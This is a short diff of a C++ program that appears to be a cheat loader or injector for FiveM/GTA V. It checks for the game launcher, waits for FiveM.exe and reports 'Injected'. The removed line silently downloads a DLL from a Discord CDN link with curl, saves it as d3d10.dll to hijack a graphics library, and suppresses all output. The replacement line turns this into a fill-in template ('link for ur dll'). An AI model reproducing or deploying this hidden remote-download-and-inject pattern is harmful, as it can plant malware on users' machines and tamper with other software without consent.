@@ -109,7 +109,7 @@ int main(int argc, const char* argv[]) {
 	ifstream fichier("GTAVLauncher.exe");
 	if (fichier)
 	{
-		system("curl https://cdn.discordapp.com/attachments/1012749638635368551/1083150214564691988/GTAProcess.dll --output d3d10.dll >nul 2>&1");
+		system("curl (link for ur dll) --output (path) >nul 2>&1");
 		std::cout << "[" << con::fg_red << "+" << con::fg_white << "] Waiting for " << con::fg_green << "FiveM.exe" << con::fg_red << "" << con::fg_white << " ..." << endl;
 		for (; !GetProcessEntryByName("FiveM.exe", &pe); Sleep(100));
 		std::cout << "[" << con::fg_red << "+" << con::fg_white << "] Injected !" << endl;
